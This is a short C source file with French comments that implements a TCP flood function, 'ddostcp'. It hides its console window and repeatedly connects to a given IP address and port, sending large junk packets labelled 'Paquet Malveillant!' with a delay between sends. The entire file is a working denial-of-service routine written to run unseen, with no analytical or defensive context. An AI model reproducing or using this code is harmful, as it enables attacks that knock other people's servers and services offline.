#include "proto.h"
#include <winsock2.h>
#include <stdio.h>


int ddostcp(int port, char * addrip, int nbpackets, int sizepacket, int delai )
{
	FreeConsole(); // Cacher la consoles win
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    /* - Initialisation du socket - */

	BYTE data[sizepacket]; // Création d'un tableau de byte de taille 0xFFFF -> Soit 65535 bytes -> 64kb
	memset(data,0xCC,sizepacket); // Remplis le tableau de byte de 0xCC 0xFFFF foisl


	strcpy( (char*) data, "Paquet Malveillant!"); // Rajoute

	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(addrip);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(port);

	for ( int i=0; i<nbpackets; i++ )
	{
		sock = socket(AF_INET,SOCK_STREAM,0);
		connect(sock, (SOCKADDR *)&sin, sizeof(sin));
		send(sock, data, sizeof(data), 0);
		closesocket(sock);
		Sleep( delai );

	}
	/* - Fermeture du socket - */

    WSACleanup();
    return 0;

}